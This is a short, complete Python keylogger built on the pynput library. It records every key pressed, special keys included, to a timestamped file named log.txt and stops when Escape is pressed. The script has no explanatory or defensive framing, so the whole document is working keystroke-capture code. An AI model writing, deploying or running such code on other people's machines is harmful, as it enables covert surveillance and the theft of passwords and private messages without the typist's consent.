from pynput.keyboard import Key, Listener
import logging
import time

# Register config more eficient
logging.basicConfig(filename='log.txt', level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    # Handles keypress events.
    try:
        logging.info(f'Key pressed: {key.char}')  # Register pressed keys
    except AttributeError:
        logging.info(f'Special key pressed: {key}')  # Register special keys

def on_release(key):
    # Stops listener when 'Escape' key is pressed.
    if key == Key.esc:
        return False

# Listener ON
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
